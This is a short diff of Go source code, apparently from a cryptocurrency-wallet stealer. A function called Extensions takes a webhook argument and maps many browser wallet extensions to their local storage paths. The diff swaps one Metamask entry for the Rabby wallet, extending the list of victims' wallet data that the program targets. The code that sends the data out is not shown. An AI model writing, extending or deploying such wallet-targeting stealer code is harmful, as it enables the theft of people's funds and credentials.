@@ -105,7 +105,7 @@ func Extensions(webhook string) {
 		"Martian":         "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk",
 		"Math":            "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc",
 		"Metamask":        "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn",
-		"Metamask2":       "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm",
+		"Rabby":           "\\Local Extension Settings\\acmacodkjbdgmoleebolmdjonilkdbch",
 		"Mobox":           "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo",
 		"Nami":            "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo",
 		"Nifty":           "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid",
